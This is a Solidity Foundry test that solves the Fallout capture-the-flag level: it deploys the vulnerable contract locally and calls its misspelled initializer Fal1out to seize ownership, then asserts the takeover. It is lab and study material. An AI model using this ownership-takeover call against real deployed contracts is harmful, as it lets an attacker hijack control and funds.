// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/2-Fallout.sol";

contract falloutTest is Test {
    Fallout public falloutCTF;

    function setUp() public {
        falloutCTF = new Fallout();
    }

    function testAttack() public {
        // initialize the contract & claim ownership
        falloutCTF.Fal1out{value: 0.0001 ether}();

        assertEq(falloutCTF.owner(), address(this));
    }

    receive() external payable {}
}
